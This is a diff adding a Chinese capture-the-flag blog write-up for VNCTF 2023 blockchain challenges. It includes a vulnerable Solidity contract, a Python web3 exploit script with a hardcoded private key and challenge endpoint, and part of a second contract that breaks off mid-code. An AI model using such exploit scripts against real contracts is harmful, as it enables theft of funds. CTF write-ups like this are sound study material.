@@ -1,0 +1,497 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>vnctf-blockchain - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vnctf-blockchain">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-18 12:46" pubdate>
+        2023年2月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      32
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vnctf-blockchain</h1>
+            
+            <div class="markdown-body">
+              <h1 id="vnctf-blockchain"><a href="#vnctf-blockchain" class="headerlink" title="vnctf blockchain"></a>vnctf blockchain</h1><p>前面两道挺简单的，最后一个首先对合约逆向就卡了，还得多逆逆练练。</p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>源码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity ^<span class="hljs-number">0.4</span>.<span class="hljs-number">23</span>;<br><br>contract Checkin &#123;<br><br>  <span class="hljs-built_in">string</span> public welcomeMessage;<br>  uint16 public year;<br><br>  constructor(<span class="hljs-built_in">string</span> _mssg) &#123;<br>    welcomeMessage = _mssg;<br>    year = <span class="hljs-number">2022</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> set<span class="hljs-constructor">Msg(<span class="hljs-params">string</span> <span class="hljs-params">_welcomeMessage</span>,<span class="hljs-params">uint16</span> <span class="hljs-params">_newyear</span>)</span> public&#123;<br>      welcomeMessage = _welcomeMessage;<br>      year = year - _newyear;<br>  &#125;<br><br>    <span class="hljs-keyword">function</span> uint<span class="hljs-constructor">ToStr(<span class="hljs-params">uint</span> <span class="hljs-params">_i</span>)</span> internal pure returns (<span class="hljs-built_in">string</span> memory _uintAsString) &#123;<br>        uint number = _i;<br>        <span class="hljs-keyword">if</span> (number<span class="hljs-operator"> == </span><span class="hljs-number">0</span>) &#123;<br>            return <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br>        uint j = number;<br>        uint len;<br>        <span class="hljs-keyword">while</span> (j != <span class="hljs-number">0</span>) &#123;<br>            len++;<br>            j /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-built_in">bytes</span> memory bstr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">bytes</span>(len);<br>        uint k = len - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (number != <span class="hljs-number">0</span>) &#123;<br>            bstr<span class="hljs-literal">[<span class="hljs-identifier">k</span>--]</span> = byte(uint8(<span class="hljs-number">48</span> + number % <span class="hljs-number">10</span>));<br>            number /= <span class="hljs-number">10</span>;<br>        &#125;<br>        return <span class="hljs-built_in">string</span>(bstr);<br>    &#125;<br><br>  <span class="hljs-keyword">function</span> str<span class="hljs-constructor">Concat(<span class="hljs-params">string</span> <span class="hljs-params">_a</span>, <span class="hljs-params">string</span> <span class="hljs-params">_b</span>)</span> internal returns (<span class="hljs-built_in">string</span>)&#123;<br>        <span class="hljs-built_in">bytes</span> memory _ba = <span class="hljs-built_in">bytes</span>(_a);<br>        <span class="hljs-built_in">bytes</span> memory _bb = <span class="hljs-built_in">bytes</span>(_b);<br>        <span class="hljs-built_in">string</span> memory ret = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_ba</span>.</span></span>length + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_bb</span>.</span></span>length);<br>        <span class="hljs-built_in">bytes</span> memory bret = <span class="hljs-built_in">bytes</span>(ret);<br>        uint k = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (uint i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_ba</span>.</span></span>length; i++)bret<span class="hljs-literal">[<span class="hljs-identifier">k</span><span class="hljs-operator">++</span>]</span> = _ba<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_bb</span>.</span></span>length; i++) bret<span class="hljs-literal">[<span class="hljs-identifier">k</span><span class="hljs-operator">++</span>]</span> = _bb<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;<br>        return <span class="hljs-built_in">string</span>(ret);<br>   &#125;<br><br>  <span class="hljs-keyword">function</span> is<span class="hljs-constructor">Solved()</span> public view returns(<span class="hljs-built_in">bool</span>)&#123;<br>      var msg =str<span class="hljs-constructor">Concat(<span class="hljs-params">welcomeMessage</span>,<span class="hljs-params">uintToStr</span>(<span class="hljs-params">year</span>)</span>);<br>      return (keccak256(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-string">&quot;Welcome to VNCTF2023&quot;</span>)</span>)<span class="hljs-operator"> == </span>keccak256(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">msg</span>)</span>));<br>  &#125;<br><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure>
+<p>签到题，将<code>welcomeMessage</code>设置为<code>Welcome to VNCTF202</code>，_newyear为2019即可。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> solcx<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> solcx <span class="hljs-keyword">import</span> compile_files<br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3,HTTPProvider<br><span class="hljs-keyword">from</span> hexbytes <span class="hljs-keyword">import</span> *<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_tx</span>(<span class="hljs-params">chainID, to, data, value</span>):</span><br>    <span class="hljs-comment"># print(web3.eth.gasPrice)</span><br>    <span class="hljs-comment"># print(web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)))</span><br>    txn = &#123;<br>        <span class="hljs-string">&#x27;chainId&#x27;</span>: chainID,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(account_address),<br>        <span class="hljs-string">&#x27;to&#x27;</span>: to,<br>        <span class="hljs-string">&#x27;gasPrice&#x27;</span>: web3.eth.gasPrice ,<br>        <span class="hljs-string">&#x27;gas&#x27;</span>: <span class="hljs-number">3000000</span>,<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)) ,<br>        <span class="hljs-string">&#x27;value&#x27;</span>: Web3.toWei(value, <span class="hljs-string">&#x27;ether&#x27;</span>),<br>        <span class="hljs-string">&#x27;data&#x27;</span>: data,<br>    &#125;<br>    <span class="hljs-comment"># print(txn)</span><br>    <span class="hljs-keyword">return</span> txn<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign_and_send</span>(<span class="hljs-params">txn</span>):</span><br>    signed_txn = web3.eth.account.signTransaction(txn, private_key)<br>    txn_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class="hljs-built_in">hex</span>()<br>    txn_receipt = web3.eth.waitForTransactionReceipt(txn_hash)<br>    <span class="hljs-comment"># print(&quot;txn_hash=&quot;, txn_hash)</span><br>    <span class="hljs-keyword">return</span> txn_receipt<br><br><br><span class="hljs-comment"># solcx.install_solc(&#x27;0.4.23&#x27;)</span><br>web3=Web3(HTTPProvider(<span class="hljs-string">&quot;http://1.14.72.170:8545/&quot;</span>))<br><span class="hljs-comment"># key=w3.eth.account.create()</span><br><span class="hljs-comment"># print(hex(bytes_to_long(key.privateKey)))</span><br><span class="hljs-comment"># account= w3.eth.account.from_key(&#x27;0x719e289ff8306c4e9ff66476bf35889e24eaa475c80878a2a42c760efaed2134&#x27;)</span><br><br>private_key = <span class="hljs-string">&#x27;2ce70ec7710618ff4a9b5ca404e065ad8a1abfdda06ce9b23efd0d67c3eac876&#x27;</span><br>acct = web3.eth.account.from_key(private_key)<br>chain_id = <span class="hljs-number">45267</span><br>account_address = acct.address<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_address is &quot;</span> + <span class="hljs-built_in">str</span>(account_address))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_Balance is &quot;</span> + <span class="hljs-built_in">str</span>(web3.eth.getBalance(account_address)))<br><br>target_address = <span class="hljs-string">&quot;0x3Ec510A7D68E7fd3C97bbAd701F874c6E3Cfe7CB&quot;</span><br>target_abi = <span class="hljs-string">&#x27;&#x27;&#x27;[</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		&quot;constant&quot;: true,</span><br><span class="hljs-string">		&quot;inputs&quot;: [],</span><br><span class="hljs-string">		&quot;name&quot;: &quot;isSolved&quot;,</span><br><span class="hljs-string">		&quot;outputs&quot;: [</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;bool&quot;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		],</span><br><span class="hljs-string">		&quot;payable&quot;: false,</span><br><span class="hljs-string">		&quot;stateMutability&quot;: &quot;view&quot;,</span><br><span class="hljs-string">		&quot;type&quot;: &quot;function&quot;</span><br><span class="hljs-string">	&#125;,</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		&quot;constant&quot;: true,</span><br><span class="hljs-string">		&quot;inputs&quot;: [],</span><br><span class="hljs-string">		&quot;name&quot;: &quot;welcomeMessage&quot;,</span><br><span class="hljs-string">		&quot;outputs&quot;: [</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;string&quot;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		],</span><br><span class="hljs-string">		&quot;payable&quot;: false,</span><br><span class="hljs-string">		&quot;stateMutability&quot;: &quot;view&quot;,</span><br><span class="hljs-string">		&quot;type&quot;: &quot;function&quot;</span><br><span class="hljs-string">	&#125;,</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		&quot;constant&quot;: true,</span><br><span class="hljs-string">		&quot;inputs&quot;: [],</span><br><span class="hljs-string">		&quot;name&quot;: &quot;year&quot;,</span><br><span class="hljs-string">		&quot;outputs&quot;: [</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;uint16&quot;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		],</span><br><span class="hljs-string">		&quot;payable&quot;: false,</span><br><span class="hljs-string">		&quot;stateMutability&quot;: &quot;view&quot;,</span><br><span class="hljs-string">		&quot;type&quot;: &quot;function&quot;</span><br><span class="hljs-string">	&#125;,</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		&quot;constant&quot;: false,</span><br><span class="hljs-string">		&quot;inputs&quot;: [</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;_welcomeMessage&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;string&quot;</span><br><span class="hljs-string">			&#125;,</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;_newyear&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;uint16&quot;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		],</span><br><span class="hljs-string">		&quot;name&quot;: &quot;setMsg&quot;,</span><br><span class="hljs-string">		&quot;outputs&quot;: [],</span><br><span class="hljs-string">		&quot;payable&quot;: false,</span><br><span class="hljs-string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span><br><span class="hljs-string">		&quot;type&quot;: &quot;function&quot;</span><br><span class="hljs-string">	&#125;,</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		&quot;inputs&quot;: [</span><br><span class="hljs-string">			&#123;</span><br><span class="hljs-string">				&quot;name&quot;: &quot;_mssg&quot;,</span><br><span class="hljs-string">				&quot;type&quot;: &quot;string&quot;</span><br><span class="hljs-string">			&#125;</span><br><span class="hljs-string">		],</span><br><span class="hljs-string">		&quot;payable&quot;: false,</span><br><span class="hljs-string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span><br><span class="hljs-string">		&quot;type&quot;: &quot;constructor&quot;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">]&#x27;&#x27;&#x27;</span><br>target_instance = web3.eth.contract(address=target_address, abi=target_abi)<br><span class="hljs-built_in">print</span>(target_instance.all_functions())<br><br><span class="hljs-comment"># setMsg()</span><br>functionSign = HexBytes(web3.sha3(text=<span class="hljs-string">&#x27;setMsg(string,uint16)&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br><span class="hljs-comment"># 0xfa65d29800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001357656c636f6d6520746f20564e43544632303200000000000000000000000000</span><br>setaccount_addr = generate_tx(chain_id, target_address, functionSign + <span class="hljs-string">&quot;000000000000000000000000&quot;</span> + account_address[<span class="hljs-number">2</span>:],<span class="hljs-number">0</span>)<br>data=  <span class="hljs-string">&quot;0xfa65d298000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000007e3000000000000000000000000000000000000000000000000000000000000001357656c636f6d6520746f20564e43544632303200000000000000000000000000&quot;</span><br>setaccount_addr = generate_tx(chain_id,target_address, data, <span class="hljs-number">0</span>)<br>sign_and_send(setaccount_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_address is &quot;</span> + <span class="hljs-built_in">str</span>(target_instance.functions.isSolved().call()))<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="http://39.107.239.30:3000/uploads/5657495e-a23d-4c69-85b0-59eceb68800a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="GetoffmyMoney"><a href="#GetoffmyMoney" class="headerlink" title="GetoffmyMoney"></a>GetoffmyMoney</h2><p>源码</p>
+<figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir">pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.7</span>;<br><br>contract GuessGame &#123;<br><br>    address <span class="hljs-keyword">private</span> GamblingHouseOwner;<br>    address <span class="hljs-keyword">public</span> Player;<br>    mapping(address =&gt; <span class="hljs-keyword">uint</span>) PlayerWins;<br>    mapping(address =&gt; <span class="hljs-keyword">bool</span>) GetMoney;<br>    mapping(address =&gt; <span class="hljs-keyword">uint</span>) PlayerPool;<br>    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> PlayerGuess;<br><br>    constructor() payable &#123;<br>        GamblingHouseOwner = msg.sender;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">despositFunds</span><span class="hljs-params">(address _addr)</span> <span class="hljs-title">private</span> </span>&#123;<br>        PlayerPool[_addr] = PlayerPool[_addr] + msg.value;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span><span class="hljs-params">(<span class="hljs-keyword">uint</span> _guess)</span> <span class="hljs-title">external</span> <span class="hljs-title">payable</span> </span>&#123;<br>        <span class="hljs-keyword">require</span>(_guess == <span class="hljs-number">0</span> || _guess == <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">require</span>(Player == address(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">require</span>(msg.value == <span class="hljs-number">1</span> ether);<br>        Player = msg.sender;<br>        despositFunds(msg.sender);<br>        PlayerGuess = _guess;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RandomCoin</span><span class="hljs-params">()</span> <span class="hljs-title">private</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> <span class="hljs-params">(<span class="hljs-keyword">uint</span>)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">uint</span>(keccak256(abi.encodePacked(block.timestamp ^ <span class="hljs-number">0x1234567</span>))) % <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">revealResult</span><span class="hljs-params">()</span> <span class="hljs-title">external</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(Player == msg.sender);<br>        <span class="hljs-keyword">uint</span> winningOption = RandomCoin();<br>        <span class="hljs-keyword">if</span> (PlayerGuess == winningOption) &#123;<br>            PlayerWins[Player] = PlayerWins[Player] + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            PlayerWins[Player] = <span class="hljs-number">0</span>;<br>        &#125;<br>        Player = address(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Winer</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> <span class="hljs-params">(<span class="hljs-keyword">uint</span>)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (PlayerWins[msg.sender]);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendValue</span><span class="hljs-params">(address payable recipient, uint256 amount)</span> <span class="hljs-title">internal</span> </span>&#123;<br>        <span class="hljs-keyword">require</span>(address(this).balance &gt;= amount);<br><br>        (<span class="hljs-keyword">bool</span> success, ) = recipient.call&#123;value: amount&#125;(<span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawMoney</span><span class="hljs-params">(address _to)</span> <span class="hljs-title">public</span> <span class="hljs-title">payable</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(PlayerWins[msg.sender] &gt;= <span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">require</span>(msg.sender == _to);<br>        <span class="hljs-keyword">if</span> (PlayerWins[_to] &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span 